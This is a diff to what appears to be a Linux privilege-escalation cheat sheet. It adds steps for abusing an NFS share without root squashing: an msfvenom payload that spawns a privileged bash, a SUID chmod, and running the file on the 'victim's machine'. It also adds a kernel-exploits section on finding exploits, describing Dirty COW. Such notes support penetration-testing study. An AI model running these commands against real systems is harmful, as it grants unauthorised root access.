@@ -169,4 +169,14 @@ take a look at `cat /etc/exports` for a mount point where `root-squashing` is di
 3. generate payload 
 	``msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf``
 
-	
+4. ``chmod +xs /tmp/nfs/shell.elf``
+5. Finally run the shared malicious file `shell.elf` on victim's machine `/tmp/shell.elf`
+
+### Kernel Exploits
+run `exploit suggerst` to find out available kernel vulnerabilities.
+
+search for available exploit for the vulnerability found. 
+
+> Dirty Cow - is a [computer security vulnerability](https://en.wikipedia.org/wiki/Computer_security_vulnerability "Computer security vulnerability") of the [Linux kernel](https://en.wikipedia.org/wiki/Linux_kernel "Linux kernel") that affected all Linux-based operating systems,
+> It is a local [privilege escalation](https://en.wikipedia.org/wiki/Privilege_escalation "Privilege escalation") bug that exploits a [race condition](https://en.wikipedia.org/wiki/Race_condition "Race condition") in the implementation of the [copy-on-write](https://en.wikipedia.org/wiki/Copy-on-write "Copy-on-write") mechanism in the kernel's memory-management subsystem. [Further](https://en.wikipedia.org/wiki/Dirty_COW)
+
